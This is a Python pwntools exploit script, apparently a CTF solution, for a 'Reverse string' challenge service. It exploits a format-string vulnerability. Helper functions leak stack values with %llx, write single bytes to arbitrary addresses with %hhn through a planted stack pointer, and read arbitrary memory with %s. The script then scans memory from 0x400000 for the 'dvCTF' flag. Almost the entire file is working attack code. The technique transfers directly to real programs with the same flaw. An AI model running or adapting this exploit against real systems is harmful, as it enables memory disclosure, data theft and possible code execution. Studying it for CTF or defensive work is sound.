#!/usr/bin/env python3
from pwn import *
from pathlib import Path

#context.log_level = 'debug'


MENU_1 = 'Reverse '
MENU_2 = 'string: '


def execute_cmd(p, cmd):
    p.sendlineafter(MENU_2, cmd[::-1])
    p.recvuntil('Result: \n')
    return p.recvuntil(MENU_1, drop=True)[:-1]


def leak_index(p, index):
    return int(execute_cmd(p, f'%{index}$llx'), 16)

def read_index(p, index):
    return execute_cmd(p, f'%{index}$s')


def print_stack(p, start, end):
    for i in range(start, end):
        value = leak_index(p, i)
        print(f'{i}: {hex(value)}')


def limited_write_byte_at_index(p, index, value):
    if value == 0:
        value = 256
    cmd = f'%140${value-1}d%{index}$hhn'.ljust(23, ' ').encode()
    execute_cmd(p, cmd)

def limited_write_byte_at_stack_addr(p, address, value):
    if value == 0:
        value = 256
    cmd = f'%140${value-1}d%10$hhn'.ljust(23, ' ').encode() + p64(address).rstrip(b'\0')
    execute_cmd(p, cmd)


_last_value_cache = None
def write_arbitrary_byte(p, address, value):
    for i, byte in enumerate(p64(address)):
        limited_write_byte_at_stack_addr(p, my_ptr_addr+i, byte)
    _last_value_cache = p64(address)
    limited_write_byte_at_index(p, my_ptr_idx, value)

def read_arbitrary_string(p, address):
    global _last_value_cache
    for i, byte in enumerate(p64(address)):
        if _last_value_cache and _last_value_cache[i] == byte:
            continue
        limited_write_byte_at_stack_addr(p, my_ptr_addr+i, byte)
    _last_value_cache = p64(address)
    return read_index(p, my_ptr_idx)


def write_arbitrary_long(p, address, value):
    for i, byte in enumerate(p64(value)):
        write_arbitrary_byte(p, address+i, byte)


p = remote('challs.dvc.tf', 8888)

stack_leak = leak_index(p, 51)
log.info(f'stack @ addr 0x{stack_leak:x}')

my_ptr_addr = stack_leak + 800
my_ptr_idx = 152

cur_addr = 0x400000

while True:
    leak = read_arbitrary_string(p, cur_addr)
    cur_addr += len(leak) + 1

    print(f'0x{cur_addr:x}: {leak}')
    if b'dvCTF' in leak:
        break


# For debugging:
#write_arbitrary_long(p, my_ptr_addr-0x10, 0x010231003233)

#print_stack(p, 1, 60)

#print_stack(p, 1, 15)
#print_stack(p, 45, 55)
#print_stack(p, 145, 155)

p.interactive()
